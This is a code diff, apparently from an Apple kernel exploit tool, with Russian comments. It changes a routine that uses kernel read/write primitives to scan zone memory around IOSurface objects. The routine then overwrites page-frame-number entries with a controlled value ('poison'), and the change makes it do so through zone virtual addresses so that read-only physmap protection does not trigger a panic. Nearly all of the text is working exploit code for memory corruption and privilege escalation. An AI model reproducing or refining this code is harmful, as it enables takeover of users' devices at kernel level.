@@ -6305,13 +6305,44 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                             if (nv >= kconstant(base) && nv < kconstant(base) + 0x6000000ULL) vtNear = YES;
                         }
                         if (!vtNear) {
-                            kpNote(r, [NSString stringWithFormat:@"  [DEP] ★ page-0 запись pfn32(hi=%u) @ %#llx+%#x → ctlPFN %#x",
-                                      (uint32_t)(q >> 32), (unsigned long long)kva, o, ctlPFN]);
+                            // 1.9.243: physmap-запись = паника на physmap-RO (1.9.220,
+                            // ребут 242) — патчим ТОЛЬКО через zone-VA: zone-скан
+                            // значения хита в окне вокруг IOSurface-объектов (P6,
+                            // безопасно). Не нашёлся → хит пропущен, physmap не трогаем.
+                            uint64_t pd243 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x30)) : 0;
+                            uint64_t ro243 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x178)) : 0;
+                            uint64_t anch[3] = { surfVA, pd243, ro243 };
+                            uint64_t mnZ = ~0ULL, mxZ = 0, zva = 0;
+                            for (int a = 0; a < 3; a++) if (kpLooksLikeKernelPointer(anch[a])) { if (anch[a] < mnZ) mnZ = anch[a]; if (anch[a] > mxZ) mxZ = anch[a]; }
+                            if (mnZ != ~0ULL) {
+                                uint64_t lo = (mnZ & ~0x3fffULL) - 0x2000000ULL, hi = (mxZ & ~0x3fffULL) + 0x2000000ULL;
+                                for (uint64_t pg = lo; pg < hi && !zva; pg += 0x4000) {
+                                    if (!kpSafeToRead(pg)) continue;
+                                    uint64_t ppa = kvtophys(pg);
+                                    int pft = ppa ? kpFrameTypeOf(ppa) : -1;
+                                    if (!(pft == 0x21 || pft == 0x6 || pft == 0xc)) continue;
+                                    uint8_t zbuf[0x4000];
+                                    kreadbuf(pg, zbuf, sizeof(zbuf));
+                                    for (uint32_t zo = 0; zo + 8 <= sizeof(zbuf) && !zva; zo += 8) {
+                                        uint64_t zq = 0; memcpy(&zq, zbuf + zo, 8);
+                                        if (zq != q) continue;
+                                        if (pg + zo == kva + o) continue;   // physmap-алиас сам себя
+                                        zva = pg + zo;
+                                    }
+                                }
+                            }
+                            if (!zva) {
+                                kpNote(r, [NSString stringWithFormat:@"  [DEP] page-0 pfn32(hi=%u) @ physmap %#llx — zone-VA НЕ найден, хит пропущен (устройство живо, яд не вписан)", (uint32_t)(q >> 32), (unsigned long long)(kva + o)]);
+                                hitForm[nDep] = -1; nDep++;
+                                continue;
+                            }
+                            kpNote(r, [NSString stringWithFormat:@"  [DEP] ★ page-0 запись pfn32(hi=%u) zone-VA %#llx → ctlPFN %#x",
+                                      (uint32_t)(q >> 32), (unsigned long long)zva, ctlPFN]);
                             usleep(1500);
-                            early_kwrite64(kva + o, (q & 0xffffffff00000000ULL) | ctlPFN);
-                            uint64_t rb = early_kread64(kva + o);
+                            early_kwrite64(zva, (q & 0xffffffff00000000ULL) | ctlPFN);
+                            uint64_t rb = early_kread64(zva);
                             kpNote(r, [NSString stringWithFormat:@"      readback: %#018llx — %@", (unsigned long long)rb, (uint32_t)rb == ctlPFN ? @"ПРИЛИПЛО" : @"МИМО"]);
-                            hitAddr[nDep] = kva + o; hitOld[nDep] = q; hitForm[nDep] = 2; nDep++;
+                            hitAddr[nDep] = zva; hitOld[nDep] = q; hitForm[nDep] = 2; nDep++;
                             continue;
                         }
                     }
@@ -6333,14 +6364,42 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                         if (run >= 4) {
                             kpNote(r, [NSString stringWithFormat:@"  [DEP] ★★ PAGE-LIST: серия %u pfn (%s) @ %#llx+%#x — патчим page-0 (lo==pfn32) на ctlPFN %#x",
                                       run, dir > 0 ? "asc" : "desc", (unsigned long long)kva, o, ctlPFN]);
+                            // 1.9.243: запись ТОЛЬКО через zone-VA (physmap-RO = паника).
+                            // Для page-0 записи серии ищем её zone-VA значением в окне.
                             for (uint32_t ri = 0; ri < run; ri++) {
                                 uint64_t qn = 0; memcpy(&qn, pbuf2 + o + (uint64_t)ri * 8, 8);
                                 if ((uint32_t)qn != pfn32) continue;
+                                uint64_t pd243 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x30)) : 0;
+                                uint64_t ro243 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x178)) : 0;
+                                uint64_t anch[3] = { surfVA, pd243, ro243 };
+                                uint64_t mnZ = ~0ULL, mxZ = 0, zva = 0;
+                                for (int a = 0; a < 3; a++) if (kpLooksLikeKernelPointer(anch[a])) { if (anch[a] < mnZ) mnZ = anch[a]; if (anch[a] > mxZ) mxZ = anch[a]; }
+                                if (mnZ != ~0ULL) {
+                                    uint64_t lo = (mnZ & ~0x3fffULL) - 0x2000000ULL, hi = (mxZ & ~0x3fffULL) + 0x2000000ULL;
+                                    for (uint64_t pg = lo; pg < hi && !zva; pg += 0x4000) {
+                                        if (!kpSafeToRead(pg)) continue;
+                                        uint64_t ppa = kvtophys(pg);
+                                        int pft = ppa ? kpFrameTypeOf(ppa) : -1;
+                                        if (!(pft == 0x21 || pft == 0x6 || pft == 0xc)) continue;
+                                        uint8_t zbuf[0x4000];
+                                        kreadbuf(pg, zbuf, sizeof(zbuf));
+                                        for (uint32_t zo = 0; zo + 8 <= sizeof(zbuf) && !zva; zo += 8) {
+                                            uint64_t zq = 0; memcpy(&zq, zbuf + zo, 8);
+                                            if (zq != qn) continue;
+                                            if (pg + zo == kva + o + (uint64_t)ri * 8) continue;
+                                            zva = pg + zo;
+                                        }
+                                    }
+                                }
+                                if (!zva) {
+                                    kpNote(r, [NSString stringWithFormat:@"      page-0 записи серии zone-VA НЕ найден — пропуск (устройство живо)"]);
+                                    continue;
+                                }
                                 usleep(1500);
-                                early_kwrite64(kva + o + (uint64_t)ri * 8, (qn & 0xffffffff00000000ULL) | ctlPFN);
-                                uint64_t rb = early_kread64(kva + o + (uint64_t)ri * 8);
-                                kpNote(r, [NSString stringWithFormat:@"      readback[%u]: %#018llx — %@", ri, (unsigned long long)rb, (uint32_t)rb == ctlPFN ? @"ПРИЛИПЛО" : @"МИМО"]);
-                                hitAddr[nDep] = kva + o + (uint64_t)ri * 8; hitOld[nDep] = qn; hitForm[nDep] = 2; nDep++;
+                                early_kwrite64(zva, (qn & 0xffffffff00000000ULL) | ctlPFN);
+                                uint64_t rb = early_kread64(zva);
+                                kpNote(r, [NSString stringWithFormat:@"      readback[%u] zone-VA %#llx: %#018llx — %@", ri, (unsigned long long)zva, (unsigned long long)rb, (uint32_t)rb == ctlPFN ? @"ПРИЛИПЛО" : @"МИМО"]);
+                                hitAddr[nDep] = zva; hitOld[nDep] = qn; hitForm[nDep] = 2; nDep++;
                             }
                             continue;
                         }
